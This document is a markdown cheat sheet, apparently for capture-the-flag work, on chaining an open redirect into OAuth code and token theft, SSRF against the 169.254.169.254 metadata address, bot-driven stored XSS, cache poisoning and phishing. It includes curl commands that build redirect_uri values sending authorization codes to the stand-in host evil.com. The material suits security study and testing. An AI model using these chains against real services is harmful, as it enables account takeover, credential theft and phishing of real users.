# Multi-step chains — the open-redirect as a hop in a longer path

## The two-hop chains — redirect -> X

### Hop-1: open-redirect -> the OAuth code launder

```text
step 1: the OAuth allowlist is https://client-app.com/*
step 2: client-app.com/redirect?next=X is an open-redirect
step 3: redirect_uri = https://client-app.com/redirect?next=https://evil.com
step 4: the OAuth server 302s -> client-app.com/redirect -> evil.com
step 5: evil.com receives ?code=<the-auth-code>
```

```bash
# the chain — the redirect_uri carries the open-redirect URL
curl -si "https://oauth.target.com/authorize?client_id=X&redirect_uri=https%3A%2F%2Fclient-app.com%2Fredirect%3Fnext%3Dhttps%253A%252F%252Fevil.com" | grep -i location
```

### Hop-1: open-redirect -> the SSRF fetch

```text
step 1: /fetch?url=X is allowlist-checked to target.com
step 2: target.com/redirect?next=X is an open-redirect
step 3: /fetch?url=https://target.com/redirect%3Fnext%3Dhttp%3A%2F%2F169.254.169.254%2F
step 4: the fetcher fetches target.com/redirect -> follows Location -> 169.254.169.254
```

### Hop-1: open-redirect -> the bot visit

```text
step 1: a "report URL" / preview bot visits attacker URLs on target.com
step 2: target.com/redirect?next=https://evil.com is an open-redirect
step 3: the bot visits target.com/redirect?next=https://evil.com
step 4: the target 302s -> the bot lands on evil.com
step 5: evil.com serves a token-stealer / CSRF / phishing page
```

## The three-hop chains — redirect -> launder -> flag

### open-redirect -> OAuth code -> session -> flag

```text
step 1: open-redirect on client-app.com
step 2: the OAuth redirect_uri launders the code to evil.com
step 3: evil.com uses the code -> a session on the OAuth account
step 4: the session reaches the flag
```

### open-redirect -> SSRF -> internal-API -> flag

```text
step 1: open-redirect on target.com
step 2: the fetcher follows the redirect to an internal API
step 3: the internal API returns the flag / a credential
```

### open-redirect -> bot -> stored-XSS -> flag

```text
step 1: the bot visits target.com/redirect?next=https://evil.com
step 2: evil.com serves a page that writes a stored XSS back to target.com
step 3: the stored XSS fires for the admin -> the flag
```

## The composite chains — redirect + another bug

```text
open-redirect + cache-poisoning  -> the redirect's Location is cached ->
                                  every visitor is redirected
open-redirect + CSRF             -> a CSRF that sets the `next` param ->
                                  the victim's login redirects to evil.com
open-redirect + token-in-fragment-> the OAuth implicit flow's
                                  #access_token through the redirect
open-redirect + IDOR             -> a redirect that exposes an object-ID
                                  in the laundered URL
```

## The redirect-chain — a redirect that hits another redirect

```text
target.com/r1?next=target.com/r2?next=evil.com
  -> r1 302s to r2 -> r2 302s to evil.com — a multi-hop open-redirect
```

```bash
# follow the chain hop-by-hop — each Location verbatim
curl -si "$BASE/r1?next=$(enc '/r2?next=//evil.com')" | grep -i location
# then r2
curl -si "$BASE/r2?next=$(enc '//evil.com')" | grep -i location
```

## The token-leak chain — the OAuth implicit flow

```text
response_type=token -> the access_token lands in the Location FRAGMENT:
Location: https://evil.com#access_token=<the-token>
the fragment is NOT sent to the server — a browser-JS read of
location.hash leaks it; the laundered #access_token IS the impact
```

## The referrer-leak chain — the URL in the Referer

```text
the redirect lands the victim on evil.com; the Referer header the victim's
browser sends to evil.com carries the ORIGINATING URL (which may carry
a token/code in its query) — a Referer-leak chain
```

## The phishing-launder chain — the domain-reputation borrow

```text
https://target.com/login?next=https://evil.com
  -> the URL LOOKS like target.com -> the victim clicks -> lands on
     evil.com — the domain-reputation launder; the evil.com page
     mimics target.com to phish credentials
```

## The chain-budget

```text
each hop is a mechanism — a hop-budget of 5 probes; a hop-falsifier is
"the downstream trust doesn't fire" — record the hop that stopped
```

## The chain-record

`chain: <hop-1-class> -> <hop-2-trust> -> <hop-3-effect>` — the open-
redirect is hop-1; the laundered trust is hop-2; the flag-effect is hop-3.
